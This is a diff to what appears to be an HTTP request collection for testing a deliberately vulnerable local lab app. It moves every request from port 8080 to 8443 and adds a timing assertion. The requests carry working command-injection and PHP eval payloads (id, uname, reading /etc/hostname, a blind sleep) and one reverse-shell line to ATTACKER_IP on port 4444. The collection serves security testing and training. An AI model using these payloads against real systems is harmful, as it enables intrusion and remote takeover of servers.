@@ -16,7 +16,7 @@
 ###   error text is expected noise - the payload output is the finding.
 ### ---------------------------------------------------------------------------
 POST {{baseUrl}}/commandi.php HTTP/1.1
-Host: localhost:8080
+Host: localhost:8443
 Cookie: {{authCookie}}
 Content-Type: application/x-www-form-urlencoded
 
@@ -28,7 +28,7 @@ target=127.0.0.1%3B%20id&form=submit
 ### CMDI-02  Pipe separator - the injected output REPLACES the nslookup output
 ### ---------------------------------------------------------------------------
 POST {{baseUrl}}/commandi.php HTTP/1.1
-Host: localhost:8080
+Host: localhost:8443
 Cookie: {{authCookie}}
 Content-Type: application/x-www-form-urlencoded
 
@@ -40,7 +40,7 @@ target=127.0.0.1%20%7C%20id&form=submit
 ### CMDI-03  && conditional chain
 ### ---------------------------------------------------------------------------
 POST {{baseUrl}}/commandi.php HTTP/1.1
-Host: localhost:8080
+Host: localhost:8443
 Cookie: {{authCookie}}
 Content-Type: application/x-www-form-urlencoded
 
@@ -54,7 +54,7 @@ target=127.0.0.1%20%26%26%20uname%20-a&form=submit
 ###   or ";" but a lone "&" still runs the command.
 ### ---------------------------------------------------------------------------
 POST {{baseUrl}}/commandi.php HTTP/1.1
-Host: localhost:8080
+Host: localhost:8443
 Cookie: {{authCookie}}
 Content-Type: application/x-www-form-urlencoded
 
@@ -68,7 +68,7 @@ target=127.0.0.1%20%26%20id&form=submit
 ###   forget that a bare newline is a command separator in sh.
 ### ---------------------------------------------------------------------------
 POST {{baseUrl}}/commandi.php HTTP/1.1
-Host: localhost:8080
+Host: localhost:8443
 Cookie: {{authCookie}}
 Content-Type: application/x-www-form-urlencoded
 
@@ -80,7 +80,7 @@ target=127.0.0.1%0Aid&form=submit
 ### CMDI-06  Read a file to prove arbitrary read, not just arbitrary exec
 ### ---------------------------------------------------------------------------
 POST {{baseUrl}}/commandi.php HTTP/1.1
-Host: localhost:8080
+Host: localhost:8443
 Cookie: {{authCookie}}
 Content-Type: application/x-www-form-urlencoded
 
@@ -96,7 +96,7 @@ target=127.0.0.1%3B%20cat%20%2Fetc%2Fhostname&form=submit
 ###   Then run this request and watch the listener.
 ### ---------------------------------------------------------------------------
 POST {{baseUrl}}/commandi.php HTTP/1.1
-Host: localhost:8080
+Host: localhost:8443
 Cookie: {{authCookie}}
 Content-Type: application/x-www-form-urlencoded
 
@@ -112,7 +112,7 @@ target=127.0.0.1%3B%20bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2FATTACKER_IP%2F4444%200
 ###   Baseline first: an un-delayed request returns in well under 1s.
 ### ---------------------------------------------------------------------------
 POST {{baseUrl}}/commandi_blind.php HTTP/1.1
-Host: localhost:8080
+Host: localhost:8443
 Cookie: {{authCookie}}
 Content-Type: application/x-www-form-urlencoded
 
@@ -124,11 +124,12 @@ target=127.0.0.1&form=submit
 ### CMDI-09  BLIND - inject a 5 second sleep and compare
 ### ---------------------------------------------------------------------------
 POST {{baseUrl}}/commandi_blind.php HTTP/1.1
-Host: localhost:8080
+Host: localhost:8443
 Cookie: {{authCookie}}
 Content-Type: application/x-www-form-urlencoded
 
 target=127.0.0.1%3B%20sleep%205&form=submit
+### EXPECT-TIME-AT-LEAST: 4000
 ### Expected: 200 after ~5 seconds instead of <1s. That delta is the oracle.
 
 
@@ -139,7 +140,7 @@ target=127.0.0.1%3B%20sleep%205&form=submit
 ###   Note this is the same class of bug as xss_eval.php but server-side.
 ### ---------------------------------------------------------------------------
 POST {{baseUrl}}/php_eval.php HTTP/1.1
-Host: localhost:8080
+Host: localhost:8443
 Cookie: {{authCookie}}
 Content-Type: application/x-www-form-urlencoded
 
@@ -151,7 +152,7 @@ eval=system(%22id%22)%3B
 ### CODE-02  Arbitrary PHP - read the app source from inside PHP
 ### ---------------------------------------------------------------------------
 POST {{baseUrl}}/php_eval.php HTTP/1.1
-Host: localhost:8080
+Host: localhost:8443
 Cookie: {{authCookie}}
 Content-Type: application/x-www-form-urlencoded
 
